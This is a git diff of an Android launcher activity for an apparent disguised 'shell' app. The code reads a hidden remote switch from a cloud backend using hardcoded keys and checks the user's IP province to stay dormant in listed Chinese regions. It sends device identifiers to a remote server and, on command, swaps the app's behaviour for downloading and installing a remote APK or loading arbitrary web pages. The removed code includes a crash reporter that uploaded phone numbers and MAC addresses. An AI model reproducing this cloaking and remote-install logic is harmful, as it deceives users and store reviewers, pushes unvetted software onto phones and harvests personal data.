@@ -19,11 +19,6 @@ import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.support.annotation.NonNull;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
-import android.support.v4.content.ContextCompat;
-import android.support.v4.content.FileProvider;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
@@ -38,7 +33,6 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.FileReader;
@@ -47,9 +41,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
-import java.io.StringWriter;
-import java.io.Writer;
-import java.lang.reflect.Field;
 import java.net.HttpURLConnection;
 import java.net.Inet4Address;
 import java.net.InetAddress;
@@ -57,15 +48,17 @@ import java.net.MalformedURLException;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.net.URL;
-import java.text.DateFormat;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Enumeration;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
-import java.util.Map;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 
 
 /**
@@ -89,18 +82,13 @@ public class MJRegusActivity extends Activity {
 
     //跳转到原马甲包启动页的全路径
     String activityPath = "REGUS_PATH";
-    //后台开关地址  域名动态获取
-    String busUrl = "/AppShellService.svc/GetAppInfo";
 
-    String root_old = "http://woaizggcdws.com:48581/shellapi/welcome";
-    String root_gitee = "https://gitee.com/tai-army/root-domain-name/raw/master/README.md";
-    String root_gitlab = "https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md";
+    String root_gitee = "https://gitee.com/mannyymm1/cqcc/raw/master/README.md";
 
     //握手地址
     String getHostUrl = root_gitee;
 
-    //服务器ip
-    String serverIp = "47.103.218.210";
+    String host = "http://ieo.titiyul.com";
 
 
     //id 值   这些限制都只是占位词  后面直接用16进制 替换
@@ -130,6 +118,7 @@ public class MJRegusActivity extends Activity {
 
 
     String downLoadUrl;
+    private String ddUrl;
     public File savefolder;
     public String updateSaveName;
 
@@ -154,8 +143,7 @@ public class MJRegusActivity extends Activity {
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.REQUEST_INSTALL_PACKAGES,
-            Manifest.permission.ACCESS_FINE_LOCATION
+            Manifest.permission.REQUEST_INSTALL_PACKAGES
     };
     List<String> mPermissionList = new ArrayList<>();
     boolean mShowRequestPermission = true;//用户是否禁止权限
@@ -262,10 +250,10 @@ public class MJRegusActivity extends Activity {
 
         brand = getDeviceBrand();
 
-        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
-
-        CrashHandler.getInstance()
-                .init(getApplicationContext());
+//        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
+//
+//        CrashHandler.getInstance()
+//                .init(getApplicationContext());
 
         //广告模式的 跳转值
         if (!TextUtils.isEmpty(getIntent().getStringExtra("regus_ad_value"))) {
@@ -296,10 +284,10 @@ public class MJRegusActivity extends Activity {
         public void run() {
 
             try {
-                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/601a83748f5787459b20a483");
+                URL urll = new URL("https://tlmdw22a.api.lncld.net/1.1/classes/UpVersion/6168e24d31c3f94692a5de7d");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setRequestProperty("X-LC-Id", "QnL4eqOeVFvxKnwF1gLDJywM-gzGzoHsz");
-                urlConnection.setRequestProperty("X-LC-Key", "8gEvCsJUQAcw2RJHpfoXknLQ");
+                urlConnection.setRequestProperty("X-LC-Id", "tLmDW22ab3CfULnkBagYBcqi-gzGzoHsz");
+                urlConnection.setRequestProperty("X-LC-Key", "YOF1GehjRo4WYR15TaE9ij3L");
                 urlConnection.setConnectTimeout(4000);
                 urlConnection.setReadTimeout(4000);
                 urlConnection.setRequestMethod("GET");
@@ -314,7 +302,6 @@ public class MJRegusActivity extends Activity {
                         buffer.append(line);
                     }
                     String jsonStr = buffer.toString();
-                    //     Log.e("regus getDt ", jsonStr + "");
 
                     //处理
                     try {
@@ -326,32 +313,84 @@ public class MJRegusActivity extends Activity {
                         String url = avObject.getString("url");
                         boolean isStop = avObject.getBoolean("stop");
 
+                        //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
+                        JSONArray ipsArray = avObject.getJSONArray("ips");
                         Log.e("avo", "s  " + show + " i  " + isStop);
 
-                        if (isStop) {
-                            if (show == 2) {
+                        if(isStop){
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
 
-                                if (url.endsWith("apk")) {
+                                    try {
 
-                                    downLoadUrl = url;
-                                    mode = 1;
-                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
-                                    showDownLoadDialog();
+                                        URL urll = new URL("https://restapi.amap.com/v3/ip?key=a11dbeb4815afc317622d62797d7e408");
+                                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+                                        urlConnection.setConnectTimeout(10000);
+                                        urlConnection.setReadTimeout(10000);
+                                        urlConnection.setRequestMethod("GET");
+                                        urlConnection.connect();
+                                        int code = urlConnection.getResponseCode();
+                                        if (code == 200) {
+                                            InputStream inputStream = urlConnection.getInputStream();
+                                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                                            String line;
+                                            StringBuffer buffer = new StringBuffer();
+                                            while ((line = bufferedReader.readLine()) != null) {
+                                                buffer.append(line);
+                                            }
+                                            String json = buffer.toString();
 
-                                } else {
-                                    Intent intent = new Intent();
-                                    intent.setAction(Intent.ACTION_VIEW);
-                                    Uri content_url = Uri.parse(url);
-                                    intent.setData(content_url);
-                                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
-                                    startActivity(intent);
+                                            //    Log.e("avo_map", "s  " + json );
+
+                                            JSONObject jsonMap = new JSONObject(json);
+
+                                            boolean isLimit = false;
+
+
+                                            for (int i = 0; i < ipsArray.length(); i++) {
+                                                String area = ipsArray.getString(i);
+                                                if (json.contains(area)) {
+                                                    isLimit = true;
+                                                }
+                                            }
+
+
+                                            if (json.contains("\"province\":[]")) {
+                                                isLimit = true;
+                                            }
+
+
+                                            String info = jsonMap.getString("info");
+
+                                            if (!info.toLowerCase().equals("ok")) {
+                                                isLimit = false;
+                                            }
+
+                                            //   Log.e("avo", "s  " + show + " i  " + isStop + " lmit "+ isLimit);
+
+                                            if(!isLimit){
+                                                lcDoRogic(isStop,show,url);
+                                            } else {
+                                                RequestThat();
+                                            }
+
+                                        } else {
+                                            Log.e("avo_0", "!200");
+                                            lcDoRogic(isStop,show,url);
+                                        }
+
+                                    } catch (JSONException e) {
+                                        Log.e("avo_2", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    } catch (Exception e) {
+                                        Log.e("avo_3", e.getLocalizedMessage() + "");
+                                        lcDoRogic(isStop,show,url);
+                                    }
+
                                 }
-
-
-                            } else {
-                                jumpLocalSplash();
-                            }
-                        } else {
+                            }).start();
+                        }else {
                             RequestThat();
                         }
 
@@ -367,6 +406,37 @@ public class MJRegusActivity extends Activity {
             }
         }
 
+    }
+
+    private void lcDoRogic(boolean isStop,int show,String url){
+        if (isStop) {
+            if (show == 2) {
+
+                if (url.endsWith("apk")) {
+//                                    downLoadUrl = url;
+//                                    mode = 1;
+//                                    showDownLoadDialog();
+
+                    ddUrl = url;
+
+                    jumpLocalSplash();
+
+                } else {
+                    Intent intent = new Intent();
+                    intent.setAction(Intent.ACTION_VIEW);
+                    Uri content_url = Uri.parse(url);
+                    intent.setData(content_url);
+                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
+                    startActivity(intent);
+                }
+
+
+            } else {
+                jumpLocalSplash();
+            }
+        } else {
+            RequestThat();
+        }
     }
 
 
@@ -487,267 +557,119 @@ public class MJRegusActivity extends Activity {
                         JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                         Log.e("regus  array size", jsonArray.length() + "");
 
-                        //  allHostSize = jsonArray.length();
-
-//                        for (int i = 0; i < jsonArray.length(); i++) {
-//                            requsetKaiGuanServer((String) jsonArray.get(i));
-//                        }
-
-                        traverseHost(jsonArray);
+                        if (jsonArray.length() > 0) {
+                            host = jsonArray.getString(0);
+                        }
 
                     } catch (JSONException e) {
                         e.printStackTrace();
                         // allHostSize = 1;
                         Log.e("regus getHost", e.getLocalizedMessage() + "");
 
-                        requsetKaiGuanServer(serverIp);
                     }
                 } else {
                     //  allHostSize = 1;
                     Log.e("regus getHost", "code 不是200 或304");
 
-                    if (getHostUrl.equals(root_gitee)) {
-                        getHostUrl = root_gitlab;
-                        getHostRequest();
-                        return;
-                    }
-
-                    if(getHostUrl.equals(root_gitlab)){
-                        getHostUrl = root_old;
-                        getHostRequest();
-                        return;
-                    }
-
-
-                    requsetKaiGuanServer(serverIp);
                 }
             } catch (Exception e) {
                 //   allHostSize = 1;
                 Log.e("regus getHost", e.getLocalizedMessage() + "");
 
-                if (getHostUrl.equals(root_gitee)) {
-                    getHostUrl = root_gitlab;
-                    getHostRequest();
-                    return;
-                }
-
-                if(getHostUrl.equals(root_gitlab)){
-                    getHostUrl = root_old;
-                    getHostRequest();
-                    return;
-                }
-
-                requsetKaiGuanServer(serverIp);
             }
 
-        }
+
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+
+                    String url = host + "/Inbound/QueryAppConfig";
+
+                    Log.e("regus 跳转请求url", url + "");
+
+                    String time = System.currentTimeMillis() + "";
+
+                    JSONObject jsonObject = new JSONObject();
+                    JSONObject paramBeanJobj = new JSONObject();
+
+                    try {
+                        jsonObject.put("ClientSource", "0");
+                        jsonObject.put("PartnerKey", "b82cc1515cd64869beefe697cce16aad");
+                        jsonObject.put("Date", time);
+
+                        paramBeanJobj.put("AppKey", mAid);
+                        paramBeanJobj.put("ChannelId", mSid);
+                        paramBeanJobj.put("Mac", macAddress);
+
+                        jsonObject.put("Param", paramBeanJobj);
 
 
-    }
-
-
-    void traverseHost(JSONArray jsonArray) {
-
-        List<String> stringList = new ArrayList<>();
-
-        for (int i = 0; i < jsonArray.length(); i++) {
-            try {
-                stringList.add((String) jsonArray.get(i));
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-        }
-        mHosts = stringList;
-
-        if (mHosts.size() > 0) {
-            mCurrentReqposition = 0;
-            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
-        }
-
-    }
-
-
-    void requestNextHost() {
-        int hostSize = mHosts.size();
-        if (mCurrentReqposition < hostSize - 1) {
-            mCurrentReqposition = mCurrentReqposition + 1;
-            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
-        } else {
-            //没有任何域名可用
-            jumpLocalSplash();
-        }
-    }
-
-
-    private void requsetKaiGuanServer(String bUrl) {
-
-        String url = "http://" + bUrl + busUrl;
-
-        new Thread(new RequestMacRunnable(mAid, mSid, url, bUrl)).start();
-
-    }
-
-
-    private class RequestMacRunnable implements Runnable {
-
-        String url;
-        String aid;
-        String sid;
-        String host;
-
-        public RequestMacRunnable(String aid, String sid, String url, String bul) {
-            this.aid = aid;
-            this.sid = sid;
-            this.url = url;
-            host = bul;
-        }
-
-
-        @Override
-        public void run() {
-
-            if (TextUtils.isEmpty(macAddress)) {
-                new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
-                return;
-            }
-
-            String rootUrl = "http://" + host + "/AppShellService.svc/IsBlack?mac=" + macAddress;
-
-            Log.e("regus_", "请求的mac接口 " + rootUrl);
-
-
-            try {
-                URL urll = new URL(rootUrl);
-                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-                int code = urlConnection.getResponseCode();
-                if (code == 200) {
-
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                    String line;
-                    StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
-                        buffer.append(line);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
                     }
-                    String jsonStr = buffer.toString();
-                    Log.e("regus_mac接口返回", jsonStr + "");
 
-                    JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));
+                    String param = jsonObject.toString();
 
-                    if (responseJson.has("Status") && responseJson.has("Data")) {
+                    Log.e("regus", "post param " + param);
 
-                        if (responseJson.getBoolean("Data")) {
-                            //是黑名单手机
-                            jumpLocalSplash();
+                    try {
+
+                        PrintWriter out = null;
+
+                        URL urll = new URL(url);
+                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+                        urlConnection.setConnectTimeout(15000);
+                        urlConnection.setReadTimeout(15000);
+                        urlConnection.setRequestMethod("POST");
+
+                        urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
+                        urlConnection.setDoOutput(true);
+                        urlConnection.setDoInput(true);
+                        urlConnection.setUseCaches(false)
+                        ;
+
+                        out = new PrintWriter(urlConnection.getOutputStream());
+
+                        // 发送请求参数
+
+                        out.print(param);
+
+                        // flush输出流的缓冲
+
+                        out.flush();
+                        out.close();
+
+                        Log.e("regus", "post start");
+
+                        int code = urlConnection.getResponseCode();
+
+                        if (code == 200) {
+
+                            InputStream inputStream = urlConnection.getInputStream();
+                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                            String line;
+                            StringBuffer buffer = new StringBuffer();
+                            while ((line = bufferedReader.readLine()) != null) {
+                                buffer.append(line);
+                            }
+                            String jsonStr = buffer.toString();
+                            Log.e("regus", jsonStr + "");
+
+                            solveLines(true, jsonStr, MJRegusActivity.this);
+
                         } else {
-                            new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
+                            Log.e("regus", "不是200");
+                            solveLines(false, null, MJRegusActivity.this);
                         }
-                    } else {
-                        //  jumpLocalSplash();
-                        requestNextHost();
+                    } catch (Exception e) {
+                        Log.e("regus", "请求开关错误 " + e.getLocalizedMessage());
+                        solveLines(false, null, MJRegusActivity.this);
                     }
 
-                } else {
-                    // jumpLocalSplash();
-                    requestNextHost();
+
                 }
-            } catch (Exception e) {
-                // jumpLocalSplash();
-                requestNextHost();
-                Log.e("reugs", "mac接口 " + e.getLocalizedMessage());
-            }
+            }).start();
 
-        }
-
-    }
-
-
-    private class RequestAppInfoRunnable implements Runnable {
-
-        String url;
-        String aid;
-        String sid;
-        String host;
-
-        public RequestAppInfoRunnable(String aid, String sid, String url, String bul) {
-            this.aid = aid;
-            this.sid = sid;
-            this.url = url;
-            host = bul;
-        }
-
-        @Override
-        public void run() {
-
-            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
-                jumpLocalSplash();
-                return;
-            }
-
-            String rootUrl = url + "?aid=";
-
-
-            String allUrl = rootUrl + aid + "&sid=" + sid;
-
-            Log.e("regus_", "请求的接口 " + allUrl);
-
-            try {
-                URL urll = new URL(allUrl);
-                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                urlConnection.setRequestMethod("GET");
-
-                Log.e("regus", " header中 增加mac " + macAddress);
-
-                if (!macAddress.equals("02:00:00:00:00:00")) {
-                    urlConnection.setRequestProperty("mac", macAddress);
-                } else {
-                    urlConnection.setRequestProperty("mac", "某手机获取不到mac地址或设备号");
-                }
-
-                urlConnection.setRequestProperty("qId", System.currentTimeMillis() + "");
-
-                if (!TextUtils.isEmpty(ip)) {
-                    urlConnection.setRequestProperty("ip", ip);
-                }
-
-                urlConnection.setRequestProperty("deviceType", "Andriod");
-
-                if (!TextUtils.isEmpty(phoneNum)) {
-                    urlConnection.setRequestProperty("mobile", phoneNum);
-                }
-
-                urlConnection.setRequestProperty("osVersion", sysInfo);
-                urlConnection.setRequestProperty("provider", brand);
-
-
-                urlConnection.connect();
-                int code = urlConnection.getResponseCode();
-                if (code == 200) {
-
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                    String line;
-                    StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
-                        buffer.append(line);
-                    }
-                    String jsonStr = buffer.toString();
-                    Log.e("regus", jsonStr + "");
-
-                    solveLines(true, host, jsonStr);
-
-                } else {
-                    solveLines(false, host, null);
-                }
-            } catch (Exception e) {
-                solveLines(false, host, null);
-            }
 
         }
 
@@ -760,7 +682,7 @@ public class MJRegusActivity extends Activity {
     /**
      * 处理几个ping 域名的请求
      */
-    private synchronized void solveLines(boolean isOK, String host, String buJson) {
+    private synchronized void solveLines(boolean isOK, String buJson, Activity activity) {
 
         if (isGetKgRepInfoAlready) {
             Log.e("regus_", " 已经有可用域名 其他的直接return");
@@ -770,110 +692,165 @@ public class MJRegusActivity extends Activity {
 
         if (isOK) {
 
-            Log.e("regus_", " 域名: " + host + " 可用, 已经被优先使用了");
-
             isGetKgRepInfoAlready = true;
 
             //处理
             try {
                 JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));
 
-                if (responseJson.has("Status") && responseJson.has("Data")) {
-                    if (responseJson.getBoolean("Status")) {
+                if (responseJson.has("Code") && responseJson.has("Value")) {
+                    if (responseJson.getInt("Code") == 1) {
+
+                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Value"));
 
 
-                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));
+                        //IsLimit
+                        if (dataJsonObject.getBoolean("IsLimit")) {
+                            Log.e("regus_", " IsLimit true");
+                            return;
+                        }
 
-                        if (!dataJsonObject.getBoolean("IsAdvertising")) {
+                        if (!dataJsonObject.getBoolean("IsOpenAdvert")) {
                             clearSp(getBaseContext());
                         }
 
-
-                        if (dataJsonObject.has("IsMix") && dataJsonObject.getBoolean("IsMix")) {
-                            //融合模式
-                            mode = 2;
-
-                            //融合模式
-                            runOnUiThread(new Runnable() {
+                        if (dataJsonObject.has("IsOpenFuse") && dataJsonObject.getBoolean("IsOpenFuse")) {
+                            activity.runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                    Toast.makeText(getApplicationContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
+                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
+                                    getApkFromAssets();
                                 }
                             });
-                            //环彩181504
-                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
-                            getApkFromAssets();
 
-                        } else if (dataJsonObject.getBoolean("IsAdvertising")) {
-
-                            if (dataJsonObject.has("AdvertiseList")) {
-                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");
-
-                                String key_ad_kg = "key_ad_kg";
-                                String key_ad_value = "key_ad_value";
-
-                                String key_ad_h5_kg_value = "key_ad_h5_kg_value"; //广告单元本身的h5
+                            return;
+                        }
 
 
-                                if (advertiseArray != null) {
-                                    for (int i = 0; i < advertiseArray.length(); i++) {
-                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
-                                        if (jsonObject != null) {
-                                            if (jsonObject.has("AdvertiseUrl")) {
+                        if (dataJsonObject.getBoolean("IsOpenAdvert")) {
+                            activity.runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
 
-                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
-                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();
+                                    String key_ad_kg = "regus_download_open_";
+                                    String key_ad_value = "regus_download_url_";
+                                    String key_pic_value = "regus_ad_pic_url_";
 
+                                    try {
+                                        if (dataJsonObject.has("AdvertUrlJson")) {
+                                            JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertUrlJson");
+
+
+                                            if (advertiseArray != null) {
+                                                for (int i = 0; i < advertiseArray.length(); i++) {
+                                                    JSONObject jsonObject = advertiseArray.getJSONObject(i);
+                                                    if (jsonObject != null) {
+                                                        if (jsonObject.has("JumpUrl")) {
+                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                                    .putString(key_ad_value + (i+1), jsonObject.getString("JumpUrl")).apply();
+                                                        }
+
+
+                                                        if (jsonObject.has("Switch")) {
+                                                            boolean open = jsonObject.getInt("Switch") == 1;
+                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                                    .putBoolean(key_ad_kg + (i+1), open).apply();
+                                                        }
+
+                                                        if (jsonObject.has("ImgUrl")) {
+                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                                    .putString(key_pic_value + (i+1), jsonObject.getString("ImgUrl")).apply();
+                                                        }
+
+                                                    }
+                                                }
                                             }
 
-                                            if (jsonObject.has("H5Url")) {
+                                        }
+                                    } catch (JSONException e) {
 
-                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
-                                                        .putString(key_ad_h5_kg_value + i, jsonObject.getString("H5Url")).apply();
-
-                                            }
+                                    }
 
 
-                                            if (jsonObject.has("IsEnable")) {
+                                    if (!TextUtils.isEmpty(ddUrl)) {
 
-                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
-                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
-                                            }
+                                        for (int i = 0; i < 30; i++) {
+                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                    .putString(key_ad_value + (i+1), ddUrl).apply();
+
+                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
+                                                    .putBoolean(key_ad_kg + (i+1), true).apply();
                                         }
                                     }
+
+                                    jumpLocalSplash();
                                 }
+                            });
+                            return;
 
-                            }
+                        }
 
-                            jumpLocalSplash();
 
-                        } else if (dataJsonObject.getBoolean("IsDownload")) {
-                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
-                            mode = 1;
-                            Log.e("regus 得到的下载链接: ", downLoadUrl);
-                            showDownLoadDialog();
-                        } else if (dataJsonObject.getBoolean("IsEnable")) {
-                            //h5模式
-                            mode = 0;
-                            startWebview(dataJsonObject.getString("Url"));
-                        } else {
-                            jumpLocalSplash();
+                        if (dataJsonObject.getBoolean("IsOpenDown")) {
+                            Log.e("regus_", " IsOpenDown true");
+                            activity.runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    try {
+                                        downLoadUrl = dataJsonObject.getString("DownloadUrl");
+                                    } catch (JSONException e) {
+                                        e.printStackTrace();
+                                    }
+                                    mode = 1;
+                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
+                                    if (!TextUtils.isEmpty(ddUrl)) {
+                                        downLoadUrl = ddUrl;
+                                    }
+                                    showDownLoadDialog();
+                                }
+                            });
+                            return;
+                        }
+
+                        if (dataJsonObject.getBoolean("IsOpenJump")) {
+                            activity.runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
+                                    mode = 0;
+                                    try {
+
+                                        if (!TextUtils.isEmpty(ddUrl)) {
+                                            startWebview(ddUrl);
+                                            return;
+                                        }
+
+                                        startWebview(dataJsonObject.getString("JumpUrl"));
+                                    } catch (JSONException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
+                            });
+                            return;
                         }
 
                     } else {
+                        Log.e("regus_", " error 13");
                         jumpLocalSplash();
                     }
-                    return;
+                } else {
+                    Log.e("regus_", " error 12");
+                    jumpLocalSplash();
                 }
 
-            } catch (JSONException e) {
+            } catch (Exception e) {
                 e.printStackTrace();
                 jumpLocalSplash();
             }
 
         } else {
-            Log.e("regus_", " 域名: " + host + " 不可用");
-            requestNextHost();
+            jumpLocalSplash();
+            Log.e("regus_", " error 1");
         }
 
     }
@@ -892,6 +869,7 @@ public class MJRegusActivity extends Activity {
      */
 
     private void jumpLocalSplash() {
+
         try {
             Class aimClass = Class.forName(activityPath);
             Intent intent = new Intent(MJRegusActivity.this, aimClass);
@@ -1563,8 +1541,8 @@ public class MJRegusActivity extends Activity {
     public static String getSystemInfo() {
 
         String handSetInfo =
-                " android " + android.os.Build.VERSION.RELEASE +
-                        "  /  " + android.os.Build.MODEL;
+                " android " + Build.VERSION.RELEASE +
+                        "  /  " + Build.MODEL;
 
         Log.e("regus", "手机信息 " + handSetInfo);
 
@@ -1578,272 +1556,7 @@ public class MJRegusActivity extends Activity {
      * @return 手机厂商
      */
     public static String getDeviceBrand() {
-        return android.os.Build.BRAND;
-    }
-
-
-    /**
-     * crash 相关
-     */
-
-
-    private static class CrashHandler implements Thread.UncaughtExceptionHandler {
-
-        public static final String TAG = "CrashHandler";
-
-
-        private String host;
-
-        //设备相关
-
-        private String macAddress = "";
-        private String phoneNum = "";
-        private String ip = "";
-        private String sysInfo = "";
-
-        private String aid = "";
-        private String sid = "";
-
-
-        //系统默认的UncaughtException处理类
-        private Thread.UncaughtExceptionHandler mDefaultHandler;
-        //CrashHandler实例
-        private static CrashHandler INSTANCE = new CrashHandler();
-        //程序的Context对象
-        private Context mContext;
-        //用来存储设备信息和异常信息
-        private Map<String, String> infos = new HashMap<String, String>();
-
-        //用于格式化日期,作为日志文件名的一部分
-        private DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
-
-        /**
-         * 保证只有一个CrashHandler实例
-         */
-        private CrashHandler() {
-        }
-
-        /**
-         * 获取CrashHandler实例 ,单例模式
-         */
-        public static CrashHandler getInstance() {
-            return INSTANCE;
-        }
-
-        /**
-         * 初始化
-         *
-         * @param context
-         */
-        public void init(Context context) {
-            mContext = context;
-            //获取系统默认的UncaughtException处理器
-            mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();
-            //设置该CrashHandler为程序的默认处理器
-            Thread.setDefaultUncaughtExceptionHandler(this);
-        }
-
-        public void setData(String host, String macAddress, String phoneNum, String ip, String sysInfo, String aid, String sid) {
-            this.host = host;
-            this.macAddress = macAddress;
-            this.phoneNum = phoneNum;
-            this.ip = ip;
-            this.sysInfo = sysInfo;
-            this.aid = aid;
-            this.sid = sid;
-
-            Log.e("regus", " crash SetData macAddress: " + macAddress + " phoneNum: " + phoneNum + " ip: " + ip + " sysInfo: " + sysInfo);
-        }
-
-
-        /**
-         * 当UncaughtException发生时会转入该函数来处理
-         */
-        @Override
-        public void uncaughtException(Thread thread, Throwable ex) {
-
-
-            handleException(ex);
-
-            try {
-                Thread.sleep(2000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-            System.exit(0);
-
-
-        }
-
-        /**
-         * 自定义错误处理,收集错误信息 发送错误报告等操作均在此完成.
-         *
-         * @param ex
-         * @return true:如果处理了该异常信息;否则返回false.
-         */
-        private boolean handleException(Throwable ex) {
-            if (ex == null) {
-                return false;
-            }
-            //收集设备参数信息
-            collectDeviceInfo(mContext);
-            //保存日志文件
-            saveCrashInfo2File(ex);
-            return true;
-        }
-
-        /**
-         * 收集设备参数信息
-         *
-         * @param ctx
-         */
-        public void collectDeviceInfo(Context ctx) {
-            try {
-                PackageManager pm = ctx.getPackageManager();
-                PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(), PackageManager.GET_ACTIVITIES);
-                if (pi != null) {
-                    String versionName = pi.versionName == null ? "null" : pi.versionName;
-                    String versionCode = pi.versionCode + "";
-                    infos.put("versionName", versionName);
-                    infos.put("versionCode", versionCode);
-
-                }
-            } catch (PackageManager.NameNotFoundException e) {
-
-            }
-            Field[] fields = Build.class.getDeclaredFields();
-            for (Field field : fields) {
-                try {
-                    field.setAccessible(true);
-                    infos.put(field.getName(), field.get(null).toString());
-                } catch (Exception e) {
-                }
-            }
-        }
-
-        /**
-         * 保存错误信息到文件中
-         *
-         * @param ex
-         * @return 返回文件名称, 便于将文件传送到服务器
-         */
-        private String saveCrashInfo2File(Throwable ex) {
-
-            StringBuffer sb = new StringBuffer();
-            for (Map.Entry<String, String> entry : infos.entrySet()) {
-                String key = entry.getKey();
-                String value = entry.getValue();
-                sb.append(key + "=" + value + "\n");
-            }
-
-            Writer writer = new StringWriter();
-            PrintWriter printWriter = new PrintWriter(writer);
-            ex.printStackTrace(printWriter);
-            Throwable cause = ex.getCause();
-            while (cause != null) {
-                cause.printStackTrace(printWriter);
-                cause = cause.getCause();
-            }
-            printWriter.close();
-            String result = writer.toString();
-            sb.append(result);
-
-
-            //上传 crash
-
-            new Thread(new PostCrashInfoRunnable(sb.toString())).start();
-
-            return null;
-        }
-
-
-        private class PostCrashInfoRunnable implements Runnable {
-
-
-            String LogContent;
-
-            public PostCrashInfoRunnable(String logContent) {
-                LogContent = logContent;
-            }
-
-
-            @Override
-
-            public void run() {
-
-
-                String rootUrl = "http://" + host + "/AppShellService.svc/AddCrashLog";
-
-                Log.e("regus_", "请求的crash 上传接口 " + rootUrl);
-
-
-                try {
-
-                    JSONObject body = new JSONObject();
-                    body.put("Mac", macAddress);
-                    body.put("Ip", ip);
-                    body.put("OsVersion", sysInfo);
-                    body.put("Mobile", phoneNum);
-                    body.put("AppId", aid);
-                    body.put("StoreId", sid);
-                    body.put("LogContent", LogContent);
-
-                    Log.e("regus_", "闪退文本格式: " + LogContent);
-
-                    URL urll = new URL(rootUrl);
-                    HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
